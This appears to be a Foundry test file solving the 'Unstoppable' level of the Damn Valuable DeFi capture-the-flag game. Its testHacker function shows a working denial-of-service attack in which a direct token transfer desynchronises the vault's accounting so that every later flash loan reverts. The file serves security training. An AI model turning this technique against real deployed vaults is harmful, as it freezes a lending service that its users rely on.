// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {UnstoppableVault} from "../src/unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "../src/unstoppable/ReceiverUnstoppable.sol";

contract UnstopableTest is Test {
    DamnValuableToken public token;
    UnstoppableVault vault;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address someUser = makeAddr("someUser");

    uint256 TOKENS_IN_VAULT = 1000000 ether;
    uint256 INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        // 检查金库资产
        assertEq(address(vault.asset()), address(token));
        // 检查金库余额
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        // 检查金库持有的标的资产总量
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        // 检查流通中未赎回的金库份额总数
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(
            vault.flashFee(address(token), TOKENS_IN_VAULT),
            (TOKENS_IN_VAULT * 0.05 ether) / 1e18
        );

        // start with 10 DVT tokens
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
    }

    function testSomeOne() public excuteByUser(someUser) {
        // Show it's possible for someUser to take out a flash loan
        ReceiverUnstoppable receiverContract = new ReceiverUnstoppable(
            address(vault)
        );
        receiverContract.executeFlashLoan(100 ether);
    }

    function testHacker() public excuteByUser(player) {
        ReceiverUnstoppable receiverContract = new ReceiverUnstoppable(
            address(vault)
        );

        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);

        uint256 totalSupply = vault.totalSupply();
        uint256 totalAssets = vault.totalAssets();
        console.log("totalSupply:", totalSupply / 1e18);
        console.log("totalAssets:", totalAssets / 1e18);
        console.log("share:", vault.convertToShares(totalSupply) / 1e18);

        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        receiverContract.executeFlashLoan(100 ether);
    }
}
